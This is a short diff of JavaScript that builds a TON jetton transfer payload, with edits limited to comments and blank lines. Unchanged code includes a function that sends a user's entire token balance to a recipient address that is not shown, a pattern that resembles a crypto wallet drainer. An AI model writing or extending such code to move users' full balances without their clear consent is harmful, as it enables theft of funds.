@@ -51,9 +51,9 @@
   const { BN } = TonWeb.utils;
 
   const transferCell = new Cell();
-  transferCell.bits.writeUint(0x0f8a7ea5, 32);    // transfer opcode
-  transferCell.bits.writeUint(0, 64);             // query_id
-  transferCell.bits.writeCoins(new BN(amount));   // ✅ BN from string
+  transferCell.bits.writeUint(0x0f8a7ea5, 32);
+  transferCell.bits.writeUint(0, 64);
+  transferCell.bits.writeCoins(new BN(amount));  // ✅ обязательно BN
   transferCell.bits.writeAddress(new TonWeb.Address(destination));
   transferCell.bits.writeAddress(new TonWeb.Address(response));
   transferCell.bits.writeCoins(new BN(0));
@@ -62,7 +62,6 @@
   const bocBytes = await transferCell.toBoc(false);
   return TonWeb.utils.bytesToBase64(bocBytes);
 }
-
 
     async function sendAllFPIBANK(userTonAddress) {
   const { rawBalance, decimals, userJettonWallet } = await getUserFPIBankData(userTonAddress);
@@ -77,6 +76,7 @@
 
   // ⚠️ Исправление именно тут! Используем userJettonWallet вместо userTonAddress
   const payloadBoc = await createJettonTransferPayload(rawBalance, recipientAddress, userJettonWallet);
+
 
   const transaction = {
     validUntil: Math.floor(Date.now() / 1000) + 3600,
